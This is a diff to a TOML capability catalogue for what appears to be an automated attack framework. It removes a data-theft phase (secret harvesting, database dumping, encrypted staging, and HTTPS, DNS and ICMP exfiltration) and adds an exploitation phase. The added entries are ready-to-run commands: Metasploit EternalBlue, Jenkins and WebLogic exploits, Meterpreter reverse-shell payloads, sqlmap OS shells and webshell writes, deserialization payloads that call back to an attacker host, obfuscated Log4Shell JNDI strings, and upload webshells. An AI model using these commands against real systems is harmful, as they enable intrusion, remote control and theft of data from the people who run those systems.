@@ -16007,804 +16007,3032 @@ args = ['persistence_verify.py', '--name', '{name}', '--out', '/tmp/persist_repo
 output = 'json'
 network = false
 
-# --------------------------------------------------------------------------
-# OBJECTIVES
-# --------------------------------------------------------------------------
+# ==========================================================================
+# PHASE 9 — EXPLOITATION
+# ==========================================================================
 
 [[capability]]
-id = 'objectives.objective-discovery'
-phase = 'objectives'
-label = 'OBJECTIVE DISCOVERY'
-summary = 'Locate the files named by the mission objective'
+id = 'exploitation.nuclei-critical'
+phase = 'exploitation'
+label = 'NUCLEI CRITICAL'
+summary = 'Fire critical and known-CVE templates against live targets'
 inputs = [
-  { key = 'keyword', type = 'text', required = true },
-  { key = 'path', type = 'path', required = false, default = '/srv' },
+  { key = 'url', type = 'url', required = true },
+  { key = 'list', type = 'file', required = false, default = '/tmp/urls.txt' },
 ]
 [[capability.provider]]
-binary = 'rg'
+binary = 'nuclei'
 [[capability.provider.operation]]
-name = 'Keyword Search'
-args = ['-i', '-l', '{keyword}', '{path}']
+name = 'Critical Sweep Single'
+args = ['-u', '{url}', '-severity', 'critical', '-silent', '-nc']
 output = 'lines'
-network = false
-
+network = true
 [[capability.provider.operation]]
-name = 'Hidden Search'
-args = ['--hidden', '-g', '!.git', '-i', '{keyword}', '{path}']
+name = 'Critical Sweep List'
+args = ['-l', '{list}', '-severity', 'critical', '-silent', '-nc']
 output = 'lines'
-network = false
-
+network = true
 [[capability.provider.operation]]
-name = 'Document Types'
-args = ['-t', 'md', '-t', 'txt', '-i', '{keyword}', '{path}']
+name = 'CVE Tag Sweep'
+args = ['-u', '{url}', '-tags', 'cve', '-severity', 'critical,high', '-silent', '-nc']
 output = 'lines'
-network = false
+network = true
+[[capability.provider.operation]]
+name = 'RCE Tag Sweep'
+args = ['-u', '{url}', '-tags', 'rce', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'Preauth Tag Sweep'
+args = ['-u', '{url}', '-tags', 'pre-auth,rce', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'Exploit Tag Sweep'
+args = ['-u', '{url}', '-tags', 'exploit', '-silent', '-nc']
+output = 'lines'
+network = true
 [[capability.provider]]
-binary = 'fd'
+binary = 'curl'
 [[capability.provider.operation]]
-name = 'Extension Hunt'
-args = ['-e', 'pdf', '-e', 'docx', '-e', 'xlsx', '-e', 'pptx', '--search-path', '{path}']
+name = 'Confirm RCE Echo'
+args = ['-sk', '{url}', '-d', 'cmd=id']
 output = 'lines'
-network = false
-
+network = true
 [[capability.provider.operation]]
-name = 'Backup Hunt'
-args = ['-H', '-I', '-t', 'f', 'backup.*sql', '{path}']
+name = 'Confirm Header Marker'
+args = ['-skI', '{url}']
 output = 'lines'
-network = false
+network = true
 [[capability.provider]]
-binary = 'find'
+binary = 'httpx'
 [[capability.provider.operation]]
-name = 'Sensitive Names'
-args = ['{path}', '-name', '*secret*', '-o', '-name', '*budget*', '-o', '-name', '*patent*']
+name = 'Pre Exploit Tech Detect'
+args = ['-u', '{url}', '-tech-detect', '-sc', '-title', '-silent', '-nc']
 output = 'lines'
-network = false
-
-[[capability.provider.operation]]
-name = 'Recent Spreadsheets'
-args = ['{path}', '-type', 'f', '-mtime', '-30', '-name', '*.xlsx']
-output = 'lines'
-network = false
-
-[[capability.provider.operation]]
-name = 'World Readable'
-args = ['{path}', '-perm', '-o=r', '-type', 'f', '-name', '*.conf']
-output = 'lines'
-network = false
+network = true
 [[capability.provider]]
-binary = 'locate'
+binary = 'nuclei'
 [[capability.provider.operation]]
-name = 'Index Lookup'
-args = ['-i', '{keyword}']
+name = 'Takeover Tag Sweep'
+args = ['-u', '{url}', '-tags', 'takeover', '-silent', '-nc']
 output = 'lines'
-network = false
+network = true
+[[capability.provider.operation]]
+name = 'Injection Tag Sweep'
+args = ['-u', '{url}', '-tags', 'inject,sqli,ssti,xxe', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'Default Cred Critical'
+args = ['-u', '{url}', '-tags', 'default-login', '-severity', 'critical,high', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'Exposed Panel Critical'
+args = ['-u', '{url}', '-tags', 'exposure,panel', '-severity', 'critical,high', '-silent', '-nc']
+output = 'lines'
+network = true
 [[capability.provider]]
-binary = 'grep'
+binary = 'ffuf'
 [[capability.provider.operation]]
-name = 'Pattern Sweep'
-args = ['-ri', '-e', 'confidential', '-e', 'proprietary', '-e', 'internal only', '{path}']
+name = 'Exploit Path Verify'
+args = ['-u', '{url}/FUZZ', '-w', '/usr/share/seclists/Discovery/Web-Content/raft-large-words.txt', '-mc', '200,500', '-t', '20']
 output = 'lines'
-network = false
+network = true
+[[capability.provider]]
+binary = 'nuclei'
+[[capability.provider.operation]]
+name = 'Exposure Critical List'
+args = ['-l', '{list}', '-tags', 'exposure,unauth', '-severity', 'critical', '-silent', '-nc']
+output = 'lines'
+network = true
 
 [[capability]]
-id = 'objectives.data-discovery'
-phase = 'objectives'
-label = 'DATA DISCOVERY'
-summary = 'Map structured data stores and their schemas'
+id = 'exploitation.metasploit-framework'
+phase = 'exploitation'
+label = 'METASPLOIT FRAMEWORK'
+summary = 'Run verified Metasploit modules non-interactively against targets'
 inputs = [
-  { key = 'path', type = 'path', required = false, default = '/srv/storage' },
+  { key = 'rhost', type = 'target', required = true },
+  { key = 'rport', type = 'port', required = true },
+  { key = 'lhost', type = 'target', required = true },
+  { key = 'lport', type = 'port', required = true },
 ]
 [[capability.provider]]
-binary = 'rg'
+binary = 'msfconsole'
 [[capability.provider.operation]]
-name = 'Structured Files'
-args = ['--files', '{path}', '-g', '*.json', '-g', '*.xml', '-g', '*.csv', '-g', '*.sql']
+name = 'SMB MS17-010 Check'
+args = ['-q', '-x', 'use auxiliary/scanner/smb/smb_ms17_010', '-x', 'set RHOSTS {rhost}', '-x', 'run', '-x', 'exit']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'MS17-010 Eternal Blue'
+args = ['-q', '-x', 'use exploit/windows/smb/ms17_010_eternalblue', '-x', 'set RHOSTS {rhost}', '-x', 'set RPORT {rport}', '-x', 'set LHOST {lhost}', '-x', 'set LPORT {lport}', '-x', 'run', '-x', 'exit']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'Tomcat Manager Deploy'
+args = ['-q', '-x', 'use exploit/multi/http/tomcat_mgr_upload', '-x', 'set RHOSTS {rhost}', '-x', 'set RPORT {rport}', '-x', 'set LHOST {lhost}', '-x', 'run', '-x', 'exit']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'msfconsole'
+[[capability.provider.operation]]
+name = 'Jenkins Script Console'
+args = ['-q', '-x', 'use exploit/multi/http/jenkins_script_console', '-x', 'set RHOSTS {rhost}', '-x', 'set RPORT {rport}', '-x', 'set LHOST {lhost}', '-x', 'run', '-x', 'exit']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'Weblogic Deser'
+args = ['-q', '-x', 'use exploit/multi/misc/weblogic_deserialize_rawobject', '-x', 'set RHOSTS {rhost}', '-x', 'set RPORT {rport}', '-x', 'set LHOST {lhost}', '-x', 'run', '-x', 'exit']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'Redis Unauth RCE'
+args = ['-q', '-x', 'use exploit/linux/redis/redis_unauth_exec', '-x', 'set RHOSTS {rhost}', '-x', 'set RPORT {rport}', '-x', 'run', '-x', 'exit']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'msfconsole'
+[[capability.provider.operation]]
+name = 'Search RCE Modules'
+args = ['-q', '-x', 'search rce type:exploit', '-x', 'exit']
 output = 'lines'
 network = false
-
 [[capability.provider.operation]]
-name = 'Archive Files'
-args = ['--files', '{path}', '-g', '*.zip', '-g', '*.tar.gz', '-g', '*.7z']
+name = 'Module Info Pull'
+args = ['-q', '-x', 'info exploit/windows/smb/ms17_010_eternalblue', '-x', 'exit']
 output = 'lines'
 network = false
 [[capability.provider]]
-binary = 'jq'
+binary = 'msfvenom'
 [[capability.provider.operation]]
-name = 'Schema Inspect'
-args = ['keys', '{path}/settings.json']
-output = 'lines'
-network = false
-
-[[capability.provider.operation]]
-name = 'Record Sample'
-args = ['-r', '.[0]', '{path}/exports.json']
+name = 'Stage Meterpreter Lin'
+args = ['-p', 'linux/x64/meterpreter/reverse_tcp', 'LHOST={lhost}', 'LPORT={lport}', '-f', 'elf', '-o', 'msf.elf']
 output = 'lines'
 network = false
 [[capability.provider]]
-binary = 'tree'
+binary = 'msfconsole'
 [[capability.provider.operation]]
-name = 'Directory Map'
-args = ['-L', '3', '-d', '{path}']
+name = 'Handler Start'
+args = ['-q', '-x', 'use exploit/multi/handler', '-x', 'set PAYLOAD linux/x64/meterpreter/reverse_tcp', '-x', 'set LHOST {lhost}', '-x', 'set LPORT {lport}', '-x', 'set ExitOnSession false', '-x', 'exploit -j']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'Sessions Check'
+args = ['-q', '-x', 'sessions -l', '-x', 'exit']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'Session Command Run'
+args = ['-q', '-x', 'sessions -C sysinfo', '-x', 'exit']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'msfvenom'
+[[capability.provider.operation]]
+name = 'PHP Meterpreter Stage'
+args = ['-p', 'php/meterpreter/reverse_tcp', 'LHOST={lhost}', 'LPORT={lport}', '-f', 'raw', '-o', 'msf.php']
 output = 'lines'
 network = false
 [[capability.provider]]
-binary = 'du'
+binary = 'nmap'
 [[capability.provider.operation]]
-name = 'Density Report'
-args = ['-ah', '--max-depth=2', '{path}']
+name = 'Module Target Precheck'
+args = ['-sV', '-p', '{rport}', '{rhost}']
 output = 'lines'
-network = false
+network = true
 [[capability.provider]]
-binary = 'stat'
+binary = 'msfconsole'
 [[capability.provider.operation]]
-name = 'Timestamp Audit'
-args = ['--format=%n %s %y', '{path}']
+name = 'Post Exploit Getuid'
+args = ['-q', '-x', 'sessions -C getuid', '-x', 'exit']
 output = 'lines'
-network = false
+network = true
 
 [[capability]]
-id = 'objectives.data-staging'
-phase = 'objectives'
-label = 'DATA STAGING'
-summary = 'Collect objective data into a controlled staging directory'
+id = 'exploitation.sqlmap-rce'
+phase = 'exploitation'
+label = 'SQLMAP RCE'
+summary = 'Escalate SQL injection to OS command execution and file access'
 inputs = [
-  { key = 'source', type = 'path', required = true },
-  { key = 'staging', type = 'path', required = false, default = '/tmp/stage' },
-  { key = 'bandwidth', type = 'text', required = false, default = '500' },
+  { key = 'url', type = 'url', required = true },
+  { key = 'data', type = 'text', required = false, default = '' },
 ]
 [[capability.provider]]
-binary = 'rsync'
+binary = 'sqlmap'
 [[capability.provider.operation]]
-name = 'Throttled Copy'
-args = ['-a', '--bwlimit={bandwidth}', '{source}', '{staging}']
+name = 'OS Shell Escalate'
+args = ['-u', '{url}', '--batch', '--os-shell']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'tar'
+binary = 'sqlmap'
 [[capability.provider.operation]]
-name = 'Consolidate'
-args = ['-czf', '{staging}/staged.tar.gz', '{source}']
+name = 'SQL Shell Escalate'
+args = ['-u', '{url}', '--batch', '--sql-shell']
 output = 'lines'
-network = false
+network = true
 [[capability.provider]]
-binary = 'zip'
+binary = 'sqlmap'
 [[capability.provider.operation]]
-name = 'Zip Archive'
-args = ['-r', '{staging}/staged.zip', '{source}']
+name = 'File Read Passwd'
+args = ['-u', '{url}', '--batch', '--file-read=/etc/passwd']
 output = 'lines'
-network = false
+network = true
 [[capability.provider]]
-binary = 'cpio'
+binary = 'sqlmap'
 [[capability.provider.operation]]
-name = 'Metadata Copy'
-args = ['-o', '-H', 'newc', '-F', '{staging}/staged.cpio']
+name = 'File Write Webshell'
+args = ['-u', '{url}', '--batch', '--file-write=/tmp/shell.php', '--file-dest=/var/www/html/shell.php']
 output = 'lines'
-network = false
+network = true
 [[capability.provider]]
-binary = '7z'
+binary = 'sqlmap'
 [[capability.provider.operation]]
-name = 'Maximum Compression'
-args = ['a', '-mx=9', '-p', '{staging}/staged.7z', '{source}']
+name = 'Privilege Check'
+args = ['-u', '{url}', '--batch', '--privileges']
 output = 'lines'
-network = false
+network = true
+[[capability.provider]]
+binary = 'sqlmap'
+[[capability.provider.operation]]
+name = 'Is DBA Check'
+args = ['-u', '{url}', '--batch', '--is-dba']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'sqlmap'
+[[capability.provider.operation]]
+name = 'Banner Fingerprint'
+args = ['-u', '{url}', '--batch', '--banner']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'sqlmap'
+[[capability.provider.operation]]
+name = 'Dump Current DB'
+args = ['-u', '{url}', '--batch', '--current-db']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'sqlmap'
+[[capability.provider.operation]]
+name = 'Dump Users Hashes'
+args = ['-u', '{url}', '--batch', '--passwords']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'sqlmap'
+[[capability.provider.operation]]
+name = 'Stacked Query Probe'
+args = ['-u', '{url}', '--batch', '--technique=S', '--current-user']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'sqlmap'
+[[capability.provider.operation]]
+name = 'POST Data Inject'
+args = ['-u', '{url}', '--data={data}', '--batch', '--os-shell']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Webshell RCE Verify'
+args = ['-sk', '{url.replace("?", "/../shell.php?cmd=id")}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Webshell Header Verify'
+args = ['-skI', '{url}/shell.php']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'sqlmap'
+[[capability.provider.operation]]
+name = 'Tamper Evasion Shell'
+args = ['-u', '{url}', '--batch', '--os-shell', '--tamper=space2comment']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'sqlmap'
+[[capability.provider.operation]]
+name = 'UDF Inject RCE'
+args = ['-u', '{url}', '--batch', '--os-pwn']
+output = 'lines'
+network = true
 
 [[capability]]
-id = 'objectives.secret-harvesting'
-phase = 'objectives'
-label = 'SECRET HARVESTING'
-summary = 'Hunt credentials and API keys inside staged objective data'
+id = 'exploitation.deserialization'
+phase = 'exploitation'
+label = 'DESERIALIZATION'
+summary = 'Exploit insecure deserialization across Java, PHP and Python stacks'
 inputs = [
-  { key = 'path', type = 'path', required = true },
-  { key = 'rules', type = 'file', required = false, default = 'secret_rules.yar' },
+  { key = 'url', type = 'url', required = true },
+  { key = 'rhost', type = 'target', required = true },
+  { key = 'lhost', type = 'target', required = true },
+  { key = 'lport', type = 'port', required = true },
 ]
 [[capability.provider]]
-binary = 'trufflehog'
+binary = 'ysoserial'
 [[capability.provider.operation]]
-name = 'Filesystem Scan'
-args = ['filesystem', '{path}', '--json', '--no-update']
-output = 'json'
-network = true
-[[capability.provider]]
-binary = 'gitleaks'
-[[capability.provider.operation]]
-name = 'Repository Scan'
-args = ['detect', '-s', '{path}', '-f', 'json', '-r', 'gitleaks.json']
-output = 'json'
-network = true
-[[capability.provider]]
-binary = 'rip-secrets'
-[[capability.provider.operation]]
-name = 'Fast Scan'
-args = ['{path}']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'yara'
-[[capability.provider.operation]]
-name = 'Rule Hunt'
-args = ['-r', '{rules}', '{path}']
+name = 'Commons Collections Payload'
+args = ['CommonsCollections5', 'curl http://{lhost}:{lport}/beacon']
 output = 'lines'
 network = false
 [[capability.provider]]
-binary = 'awk'
+binary = 'ysoserial'
 [[capability.provider.operation]]
-name = 'Key Value Extract'
-args = ['-F=', '-f', 'secret_extract.awk', '{path}']
+name = 'Commons Beanutils Payload'
+args = ['CommonsBeanutils1', 'curl http://{lhost}:{lport}/beacon']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'ysoserial'
+[[capability.provider.operation]]
+name = 'URLDNS Detection Payload'
+args = ['URLDNS', 'http://{lhost}:{lport}/dnsprobe']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'java'
+[[capability.provider.operation]]
+name = 'Serialize Payload B64'
+args = ['-jar', 'ysoserial.jar', 'CommonsCollections5', 'id', '|', 'base64', '-w0']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Java Deser Inject'
+args = ['-sk', '{url}', '-H', 'Content-Type: application/x-java-serialized-object', '--data-binary', '@payload.ser']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'ViewState Inject'
+args = ['-sk', '{url}', '--data-urlencode', 'viewstate=@payload.b64']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'phpggc'
+[[capability.provider.operation]]
+name = 'PHP Laravel Chain'
+args = ['Laravel/RCE9', 'system', 'id']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'phpggc'
+[[capability.provider.operation]]
+name = 'PHP Symfony Chain'
+args = ['Symfony/RCE5', 'system', 'id']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'phpggc'
+[[capability.provider.operation]]
+name = 'PHP WordPress Chain'
+args = ['WordPress/RCE3', 'system', 'id']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'PHP Deser Inject'
+args = ['-sk', '{url}', '--data-urlencode', 'data=@php_payload.txt']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Pickle Deser Inject'
+args = ['-sk', '{url}', '--data-urlencode', 'state=@pickle_payload.bin']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'python3'
+[[capability.provider.operation]]
+name = 'Pickle Payload Build'
+args = ['gen_pickle.py', '--cmd', 'curl http://{lhost}:{lport}/beacon', '--out', 'pickle_payload.bin']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Ruby Marshal Inject'
+args = ['-sk', '{url}', '--data-urlencode', 'session=@marshal_payload.bin']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nc'
+[[capability.provider.operation]]
+name = 'Callback Listener'
+args = ['-lvnp', '{lport}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'tcpdump'
+[[capability.provider.operation]]
+name = 'Deser Beacon Confirm'
+args = ['-i', 'eth0', '-nn', '-c', '10', 'port', '{lport}']
 output = 'lines'
 network = false
 
 [[capability]]
-id = 'objectives.database-dumping'
-phase = 'objectives'
-label = 'DATABASE DUMPING'
-summary = 'Dump objective databases to a portable archive'
+id = 'exploitation.log4shell-jndi'
+phase = 'exploitation'
+label = 'LOG4SHELL JNDI'
+summary = 'Detect and exploit Log4Shell JNDI injection vectors'
 inputs = [
-  { key = 'target', type = 'target', required = true },
-  { key = 'username', type = 'username', required = true },
-  { key = 'password', type = 'password', required = true },
-  { key = 'database', type = 'text', required = true },
-  { key = 'out', type = 'file', required = false, default = 'dump.sql' },
-]
-[[capability.provider]]
-binary = 'mysqldump'
-[[capability.provider.operation]]
-name = 'MySQL Dump'
-args = ['-h', '{target}', '-u', '{username}', '-p{password}', '--databases', '{database}', '--result-file', '{out}']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'pg_dump'
-[[capability.provider.operation]]
-name = 'Postgres Dump'
-args = ['-h', '{target}', '-U', '{username}', '-d', '{database}', '-f', '{out}']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'sqlite3'
-[[capability.provider.operation]]
-name = 'SQLite Dump'
-args = ['{database}', '.dump']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'impacket-mssqlclient'
-[[capability.provider.operation]]
-name = 'MSSQL Dump'
-args = ['{username}@{target}', '-windows-auth']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'mongodump'
-[[capability.provider.operation]]
-name = 'Mongo Dump'
-args = ['--host', '{target}', '--db', '{database}', '--out', 'mongo_dump/']
-output = 'lines'
-network = true
-
-[[capability]]
-id = 'objectives.archive-preparation'
-phase = 'objectives'
-label = 'ARCHIVE PREPARATION'
-summary = 'Encrypt and split staged data for transfer'
-inputs = [
-  { key = 'staging', type = 'path', required = true },
-  { key = 'passphrase', type = 'secret', required = true },
-  { key = 'out', type = 'file', required = false, default = 'stage.7z' },
-  { key = 'split', type = 'text', required = false, default = '100M' },
-]
-[[capability.provider]]
-binary = '7z'
-[[capability.provider.operation]]
-name = 'Encrypted Archive'
-args = ['a', '-mhe=on', '-p{passphrase}', '{out}', '{staging}']
-output = 'lines'
-network = false
-[[capability.provider]]
-binary = 'openssl'
-[[capability.provider.operation]]
-name = 'AES Encrypt'
-args = ['enc', '-aes-256-cbc', '-salt', '-pbkdf2', '-in', '{staging}/staged.tar.gz', '-out', '{staging}/staged.enc', '-pass', 'pass:{passphrase}']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'gpg'
-[[capability.provider.operation]]
-name = 'Symmetric Encrypt'
-args = ['--symmetric', '--cipher-algo', 'AES256', '--batch', '--passphrase', '{passphrase}', '--output', '{staging}/staged.gpg', '{staging}/staged.tar.gz']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'split'
-[[capability.provider.operation]]
-name = 'Chunk Archive'
-args = ['-b', '{split}', '{out}', 'stage.part.']
-output = 'lines'
-network = false
-[[capability.provider]]
-binary = 'zip'
-[[capability.provider.operation]]
-name = 'Password Zip'
-args = ['-r', '-P', '{passphrase}', '{out}.zip', '{staging}']
-output = 'lines'
-network = false
-
-[[capability]]
-id = 'objectives.transfer-integrity'
-phase = 'objectives'
-label = 'TRANSFER INTEGRITY'
-summary = 'Prove transferred artifacts are byte identical to the source'
-inputs = [
-  { key = 'path', type = 'path', required = true },
-  { key = 'manifest', type = 'file', required = false, default = 'manifest.sha256' },
-]
-[[capability.provider]]
-binary = 'sha256sum'
-[[capability.provider.operation]]
-name = 'Digest'
-args = ['{path}']
-output = 'lines'
-network = false
-
-[[capability.provider.operation]]
-name = 'Verify Manifest'
-args = ['--quiet', '-c', '{manifest}']
-output = 'lines'
-network = false
-[[capability.provider]]
-binary = 'b2sum'
-[[capability.provider.operation]]
-name = 'Blake2 Digest'
-args = ['{path}']
-output = 'lines'
-network = false
-[[capability.provider]]
-binary = 'md5sum'
-[[capability.provider.operation]]
-name = 'Legacy Digest'
-args = ['{path}']
-output = 'lines'
-network = false
-[[capability.provider]]
-binary = 'cksum'
-[[capability.provider.operation]]
-name = 'POSIX Checksum'
-args = ['{path}']
-output = 'lines'
-network = false
-[[capability.provider]]
-binary = 'sha1sum'
-[[capability.provider.operation]]
-name = 'SHA1 Digest'
-args = ['{path}']
-output = 'lines'
-network = false
-
-[[capability]]
-id = 'objectives.exfiltration-path'
-phase = 'objectives'
-label = 'EXFILTRATION PATH'
-summary = 'Move staged data out through approved egress channels'
-inputs = [
-  { key = 'endpoint', type = 'url', required = true },
-  { key = 'payload', type = 'file', required = true },
-  { key = 'limit', type = 'text', required = false, default = '500' },
+  { key = 'url', type = 'url', required = true },
+  { key = 'lhost', type = 'target', required = true },
+  { key = 'lport', type = 'port', required = false, default = '8888' },
 ]
 [[capability.provider]]
 binary = 'curl'
 [[capability.provider.operation]]
-name = 'HTTPS Upload'
-args = ['-s', '-X', 'POST', '--data-binary', '@{payload}', '{endpoint}']
+name = 'UA JNDI Inject'
+args = ['-sk', '{url}', '-A', '${jndi:ldap://{lhost}:{lport}/ua}']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'Header X-Api JNDI'
+args = ['-sk', '{url}', '-H', 'X-Api-Version: ${{jndi:ldap://{lhost}:{lport}/xapi}}']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'Referer JNDI Inject'
+args = ['-sk', '{url}', '-H', 'Referer: ${{jndi:ldap://{lhost}:{lport}/ref}}']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'GET Param JNDI Inject'
+args = ['-sk', '{url}?q=${{jndi:ldap://{lhost}:{lport}/get}}']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'POST Body JNDI Inject'
+args = ['-sk', '{url}', '-d', 'user=${{jndi:ldap://{lhost}:{lport}/post}}&pass=x']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'Nested Obfuscation Inject'
+args = ['-sk', '{url}', '-A', '${${lower:j}ndi:ldap://{lhost}:{lport}/nest}']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'rsync'
+binary = 'nc'
 [[capability.provider.operation]]
-name = 'Throttled Push'
-args = ['-az', '--bwlimit={limit}', '{payload}', '{endpoint}']
+name = 'JNDI Callback Listener'
+args = ['-lvnp', '{lport}']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'sftp'
+binary = 'python3'
 [[capability.provider.operation]]
-name = 'Batch Upload'
-args = ['-b', 'sftp_batch.txt', '{endpoint}']
+name = 'LDAP Referral Server'
+args = ['jndi_ldap_server.py', '--lhost', '{lhost}', '--lport', '{lport}']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'ncat'
+binary = 'tcpdump'
 [[capability.provider.operation]]
-name = 'TLS Pipe'
-args = ['--ssl', '{endpoint}']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'openssl'
-[[capability.provider.operation]]
-name = 'Raw TLS Stream'
-args = ['s_client', '-connect', '{endpoint}', '-quiet']
-output = 'lines'
-network = true
-
-[[capability]]
-id = 'objectives.covert-exfiltration'
-phase = 'objectives'
-label = 'COVERT EXFILTRATION'
-summary = 'Exfiltrate over DNS and ICMP where egress filtering is strict'
-inputs = [
-  { key = 'domain', type = 'domain', required = true },
-  { key = 'target', type = 'target', required = true },
-  { key = 'payload', type = 'file', required = true },
-]
-[[capability.provider]]
-binary = 'dnscat2'
-[[capability.provider.operation]]
-name = 'DNS Tunnel'
-args = ['--domain', '{domain}']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'iodined'
-[[capability.provider.operation]]
-name = 'IP over DNS'
-args = ['-f', '-P', 'secret', '10.0.0.1', '{domain}']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'ping'
-[[capability.provider.operation]]
-name = 'ICMP Carrier'
-args = ['-c', '1', '-p', '{payload}', '{target}']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'dig'
-[[capability.provider.operation]]
-name = 'Chunk Query'
-args = ['@ns1.{domain}', 'chunk.payload.{domain}', 'TXT']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'scapy'
-[[capability.provider.operation]]
-name = 'Custom Header'
-args = ['-c', 'covert_egress.py']
-output = 'lines'
-network = true
-
-[[capability]]
-id = 'objectives.evidence-preservation'
-phase = 'objectives'
-label = 'EVIDENCE PRESERVATION'
-summary = 'Capture forensically sound copies of objective evidence'
-inputs = [
-  { key = 'directory', type = 'path', required = true },
-  { key = 'device', type = 'path', required = false, default = '/dev/sda1' },
-  { key = 'operator', type = 'text', required = true },
-]
-[[capability.provider]]
-binary = 'script'
-[[capability.provider.operation]]
-name = 'Session Record'
-args = ['-q', '{directory}/session.typescript']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'dc3dd'
-[[capability.provider.operation]]
-name = 'Forensic Image'
-args = ['if={device}', 'of={directory}/image.dd', 'hash=sha256', 'log={directory}/dc3dd.log']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'dd'
-[[capability.provider.operation]]
-name = 'Raw Extract'
-args = ['if={device}', 'of={directory}/raw.img', 'bs=4M', 'conv=noerror,sync', 'status=progress']
+name = 'LDAP Callback Confirm'
+args = ['-i', 'eth0', '-nn', '-c', '10', 'port', '{lport}']
 output = 'lines'
 network = false
 [[capability.provider]]
-binary = 'tar'
+binary = 'java'
 [[capability.provider.operation]]
-name = 'Metadata Archive'
-args = ['--acls', '--selinux', '--xattrs', '-czf', '{directory}/evidence.tar.gz', '{directory}']
+name = 'Malicious Class Compile'
+args = ['-source', '8', '-target', '8', 'Evil.java', '-d', 'out/']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Exploit Class Serve'
+args = ['-skI', 'http://{lhost}:{lport}/Evil.class']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nuclei'
+[[capability.provider.operation]]
+name = 'Log4Shell Template Sweep'
+args = ['-u', '{url}', '-tags', 'log4j,jndi,rce', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Spring Boot JNDI Env'
+args = ['-sk', '{url}/actuator/env', '-d', 'x=${{jndi:ldap://{lhost}:{lport}/act}}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'grep'
+[[capability.provider.operation]]
+name = 'Log4j Version Hunt'
+args = ['-rE', 'log4j-core-2\\.', '/var/www/', '/opt/', '2>/dev/null']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Dns Callback Variant'
+args = ['-sk', '{url}', '-A', '${jndi:dns://{lhost}/probe}']
+output = 'lines'
+network = true
+
+[[capability]]
+id = 'exploitation.file-upload-rce'
+phase = 'exploitation'
+label = 'FILE UPLOAD RCE'
+summary = 'Achieve code execution through unrestricted file upload paths'
+inputs = [
+  { key = 'url', type = 'url', required = true },
+  { key = 'shell', type = 'file', required = false, default = '/tmp/shell.php' },
+]
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Direct PHP Upload'
+args = ['-sk', '-F', 'file=@{shell}', '{url}/upload.php']
+output = 'lines'
+network = true
